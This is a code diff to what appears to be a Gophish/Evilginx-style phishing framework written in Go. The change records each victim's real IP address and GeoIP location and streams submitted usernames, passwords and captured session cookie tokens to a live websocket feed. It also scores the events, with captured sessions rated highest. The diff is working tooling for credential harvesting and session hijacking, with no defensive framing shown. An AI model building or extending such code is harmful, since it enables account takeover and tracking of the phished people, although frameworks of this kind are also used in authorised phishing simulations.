@@ -10,12 +10,17 @@ import (
 	"net/url"
 	"time"
 
+	"net"
+	"os"
+
 	"github.com/gorilla/websocket"
 	"github.com/jinzhu/gorm"
 	_ "github.com/mattn/go-sqlite3"
+	"github.com/oschwald/geoip2-golang"
 )
 
 var gp_db *gorm.DB
+var geoDB *geoip2.Reader
 
 type Database struct {
 	path string
@@ -63,11 +68,27 @@ type EventError struct {
 	Error string `json:"error"`
 }
 
+type GeoData struct {
+	City    string  `json:"city"`
+	Country string  `json:"country"`
+	Lat     float64 `json:"lat"`
+	Lon     float64 `json:"lon"`
+}
+
 type FeedEvent struct {
-	Event   string `json:"event"`
-	Time    string `json:"time"`
-	Message string `json:"message"`
-	Tokens  string `json:"tokens"`
+	Type      string  `json:"type"`
+	Event     string  `json:"event"`
+	Time      string  `json:"time"`
+	Timestamp int64   `json:"timestamp"`
+	Message   string  `json:"message"`
+	Tokens    string  `json:"tokens"`
+	Username  string  `json:"username"`
+	Password  string  `json:"password"`
+	IP        string  `json:"ip"`
+	Phishlet  string  `json:"phishlet"`
+	SessionId string  `json:"session_id"`
+	Geo       GeoData `json:"geo"`
+	Score     int     `json:"score"`
 }
 
 func SetupGPDB(path string) error {
@@ -88,7 +109,43 @@ func SetupGPDB(path string) error {
 		time.Sleep(5 * time.Second)
 	}
 
+	// Initialize GeoIP database if available
+	if _, err := os.Stat("GeoLite2-City.mmdb"); err == nil {
+		geoDB, err = geoip2.Open("GeoLite2-City.mmdb")
+		if err != nil {
+			fmt.Printf("Error opening GeoIP database: %s\n", err)
+		} else {
+			fmt.Println("GeoIP database loaded successfully")
+		}
+	} else {
+		fmt.Println("GeoLite2-City.mmdb not found, GeoIP features disabled")
+	}
+
 	return nil
+}
+
+func getGeoData(ipStr string) GeoData {
+	geo := GeoData{}
+	if geoDB == nil {
+		return geo
+	}
+
+	ip := net.ParseIP(ipStr)
+	if ip == nil {
+		return geo
+	}
+
+	record, err := geoDB.City(ip)
+	if err != nil {
+		return geo
+	}
+
+	geo.City = record.City.Names["en"]
+	geo.Country = record.Country.Names["en"]
+	geo.Lat = record.Location.Latitude
+	geo.Lon = record.Location.Longitude
+
+	return geo
 }
 
 func moddedCookieTokensToJSON(tokens map[string]map[string]*CookieToken) string {
@@ -159,7 +216,7 @@ func (r *Result) createEvent(status string, details interface{}) (*Event, error)
 	return e, nil
 }
 
-func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool) error {
+func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool, phishlet string) error {
 	r := Result{}
 	query := gp_db.Table("results").Where("r_id=?", rid)
 	err := query.Scan(&r).Error
@@ -174,9 +231,10 @@ func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool)
 		res.RId = r.RId
 		res.UserId = r.UserId
 		res.CampaignId = r.CampaignId
-		res.IP = "127.0.0.1"
-		res.Latitude = 0.000000
-		res.Longitude = 0.000000
+		res.IP = browser["address"]
+		geo := getGeoData(res.IP)
+		res.Latitude = geo.Lat
+		res.Longitude = geo.Lon
 		res.Reported = false
 		res.BaseRecipient = r.BaseRecipient
 		event, err := res.createEvent("Email/SMS Opened", ed)
@@ -187,12 +245,12 @@ func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool)
 		res.ModifiedDate = event.Time
 		if feed_enabled {
 			if r.SMSTarget {
-				err = res.NotifySMSOpened()
+				err = res.NotifySMSOpened(phishlet)
 				if err != nil {
 					fmt.Printf("Error sending websocket message: %s\n", err)
 				}
 			} else {
-				err = res.NotifyEmailOpened()
+				err = res.NotifyEmailOpened(phishlet)
 				if err != nil {
 					fmt.Printf("Error sending websocket message: %s\n", err)
 				}
@@ -205,7 +263,7 @@ func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool)
 	}
 }
 
-func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool) error {
+func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool, phishlet string) error {
 	r := Result{}
 	query := gp_db.Table("results").Where("r_id=?", rid)
 	err := query.Scan(&r).Error
@@ -220,21 +278,22 @@ func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool)
 		res.RId = r.RId
 		res.UserId = r.UserId
 		res.CampaignId = r.CampaignId
-		res.IP = "127.0.0.1"
-		res.Latitude = 0.000000
-		res.Longitude = 0.000000
+		res.IP = browser["address"]
+		geo := getGeoData(res.IP)
+		res.Latitude = geo.Lat
+		res.Longitude = geo.Lon
 		res.Reported = false
 		res.BaseRecipient = r.BaseRecipient
 		if feed_enabled {
 			if r.Status == "Email/SMS Sent" {
-				HandleEmailOpened(rid, browser, true)
+				HandleEmailOpened(rid, browser, true, phishlet)
 				event, err := res.createEvent("Clicked Link", ed)
 				if err != nil {
 					return err
 				}
 				res.Status = "Clicked Link"
 				res.ModifiedDate = event.Time
-				err = res.NotifyClickedLink()
+				err = res.NotifyClickedLink(phishlet)
 				if err != nil {
 					fmt.Printf("Error sending websocket message: %s\n", err)
 				}
@@ -245,14 +304,14 @@ func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool)
 				}
 				res.Status = "Clicked Link"
 				res.ModifiedDate = event.Time
-				err = res.NotifyClickedLink()
+				err = res.NotifyClickedLink(phishlet)
 				if err != nil {
 					fmt.Printf("Error sending websocket message: %s\n", err)
 				}
 			}
 		} else {
 			if r.Status == "Email/SMS Sent" {
-				HandleEmailOpened(rid, browser, false)
+				HandleEmailOpened(rid, browser, false, phishlet)
 				event, err := res.createEvent("Clicked Link", ed)
 				if err != nil {
 					return err
@@ -275,7 +334,7 @@ func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool)
 	}
 }
 
-func HandleSubmittedData(rid string, username string, password string, browser map[string]string, feed_enabled bool) error {
+func HandleSubmittedData(rid string, username string, password string, browser map[string]string, feed_enabled bool, phishlet string) error {
 	r := Result{}
 	query := gp_db.Table("results").Where("r_id=?", rid)
 	err := query.Scan(&r).Error
@@ -290,9 +349,10 @@ func HandleSubmittedData(rid string, username string, password string, browser m
 		res.RId = r.RId
 		res.UserId = r.UserId
 		res.CampaignId = r.CampaignId
-		res.IP = "127.0.0.1"
-		res.Latitude = 0.000000
-		res.Longitude = 0.000000
+		res.IP = browser["address"]
+		geo := getGeoData(res.IP)
+		res.Latitude = geo.Lat
+		res.Longitude = geo.Lon
 		res.Reported = false
 		res.BaseRecipient = r.BaseRecipient
 		event, err := res.createEvent("Submitted Data", ed)
@@ -302,7 +362,7 @@ func HandleSubmittedData(rid string, username string, password string, browser m
 		res.Status = "Submitted Data"
 		res.ModifiedDate = event.Time
 		if feed_enabled {
-			err = res.NotifySubmittedData(username, password)
+			err = res.NotifySubmittedData(username, password, phishlet)
 			if err != nil {
 				fmt.Printf("Error sending websocket message: %s\n", err)
 			}
@@ -314,7 +374,7 @@ func HandleSubmittedData(rid string, username string, password string, browser m
 	}
 }
 
-func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, feed_enabled bool) error {
+func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, feed_enabled bool, phishlet string) error {
 	r := Result{}
 	query := gp_db.Table("results").Where("r_id=?", rid)
 	err := query.Scan(&r).Error
@@ -330,9 +390,10 @@ func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*Cooki
 		res.RId = r.RId
 		res.UserId = r.UserId
 		res.CampaignId = r.CampaignId
-		res.IP = "127.0.0.1"
-		res.Latitude = 0.000000
-		res.Longitude = 0.000000
+		res.IP = browser["address"]
+		geo := getGeoData(res.IP)
+		res.Latitude = geo.Lat
+		res.Longitude = geo.Lon
 		res.Reported = false
 		res.BaseRecipient = r.BaseRecipient
 		event, err := res.createEvent("Captured Session", ed)
@@ -342,7 +403,7 @@ func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*Cooki
 		res.Status = "Captured Session"
 		res.ModifiedDate = event.Time
 		if feed_enabled {
-			err = res.NotifyCapturedCookieSession(tokens)
+			err = res.NotifyCapturedCookieSession(tokens, phishlet)
 			if err != nil {
 				fmt.Printf("Error sending websocket message: %s\n", err)
 			}
@@ -351,7 +412,7 @@ func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*Cooki
 	}
 }
 
-func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, feed_enabled bool) error {
+func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, feed_enabled bool, phishlet string) error {
 	r := Result{}
 	query := gp_db.Table("results").Where("r_id=?", rid)
 	err := query.Scan(&r).Error
@@ -367,9 +428,10 @@ func HandleCapturedOtherSession(rid string, tokens map[string]string, browser ma
 		res.RId = r.RId
 		res.UserId = r.UserId
 		res.CampaignId = r.CampaignId
-		res.IP = "127.0.0.1"
-		res.Latitude = 0.000000
-		res.Longitude = 0.000000
+		res.IP = browser["address"]
+		geo := getGeoData(res.IP)
+		res.Latitude = geo.Lat
+		res.Longitude = geo.Lon
 		res.Reported = false
 		res.BaseRecipient = r.BaseRecipient
 		event, err := res.createEvent("Captured Session", ed)
@@ -379,7 +441,7 @@ func HandleCapturedOtherSession(rid string, tokens map[string]string, browser ma
 		res.Status = "Captured Session"
 		res.ModifiedDate = event.Time
 		if feed_enabled {
-			err = res.NotifyCapturedOtherSession(tokens)
+			err = res.NotifyCapturedOtherSession(tokens, phishlet)
 			if err != nil {
 				fmt.Printf("Error sending websocket message: %s\n", err)
 			}
@@ -388,7 +450,7 @@ func HandleCapturedOtherSession(rid string, tokens map[string]string, browser ma
 	}
 }
 
-func (r *Result) NotifyEmailOpened() error {
+func (r *Result) NotifyEmailOpened(phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -396,9 +458,16 @@ func (r *Result) NotifyEmailOpened() error {
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "open"
 	fe.Event = "Email Opened"
 	fe.Message = "Email has been opened by victim: <strong>" + r.Email + "</strong>"
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 10
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
@@ -408,7 +477,7 @@ func (r *Result) NotifyEmailOpened() error {
 	return err
 }
 
-func (r *Result) NotifySMSOpened() error {
+func (r *Result) NotifySMSOpened(phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -416,9 +485,16 @@ func (r *Result) NotifySMSOpened() error {
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "open"
 	fe.Event = "SMS Opened"
 	fe.Message = "SMS has been opened by victim: <strong>" + r.Email + "</strong>"
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 10
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
@@ -428,7 +504,7 @@ func (r *Result) NotifySMSOpened() error {
 	return err
 }
 
-func (r *Result) NotifyClickedLink() error {
+func (r *Result) NotifyClickedLink(phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -436,9 +512,16 @@ func (r *Result) NotifyClickedLink() error {
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "click"
 	fe.Event = "Clicked Link"
 	fe.Message = "Link has been clicked by victim: <strong>" + r.Email + "</strong>"
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 30
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
@@ -448,7 +531,7 @@ func (r *Result) NotifyClickedLink() error {
 	return err
 }
 
-func (r *Result) NotifySubmittedData(username string, password string) error {
+func (r *Result) NotifySubmittedData(username string, password string, phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -456,9 +539,18 @@ func (r *Result) NotifySubmittedData(username string, password string) error {
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "credentials"
 	fe.Event = "Submitted Data"
 	fe.Message = "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
+	fe.Username = username
+	fe.Password = password
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 80
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
@@ -468,7 +560,7 @@ func (r *Result) NotifySubmittedData(username string, password string) error {
 	return err
 }
 
-func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*CookieToken) error {
+func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*CookieToken, phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -476,11 +568,18 @@ func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*Cooki
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "session"
 	fe.Event = "Captured Session"
 	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
 	json_tokens := moddedCookieTokensToJSON(tokens)
 	fe.Tokens = json_tokens
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 100
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
@@ -490,7 +589,7 @@ func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*Cooki
 	return err
 }
 
-func (r *Result) NotifyCapturedOtherSession(tokens map[string]string) error {
+func (r *Result) NotifyCapturedOtherSession(tokens map[string]string, phishlet string) error {
 	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
 	if err != nil {
 		return err
@@ -498,11 +597,18 @@ func (r *Result) NotifyCapturedOtherSession(tokens map[string]string) error {
 	defer c.Close()
 
 	fe := FeedEvent{}
+	fe.Type = "session"
 	fe.Event = "Captured Session"
 	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
 	fe.Time = r.ModifiedDate.String()
+	fe.Timestamp = r.ModifiedDate.UnixMilli()
 	json_tokens := moddedTokensToJSON(tokens)
 	fe.Tokens = json_tokens
+	fe.Phishlet = phishlet
+	fe.IP = r.IP
+	fe.SessionId = r.RId
+	fe.Geo = getGeoData(r.IP)
+	fe.Score = 100
 	data, _ := json.Marshal(fe)
 
 	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
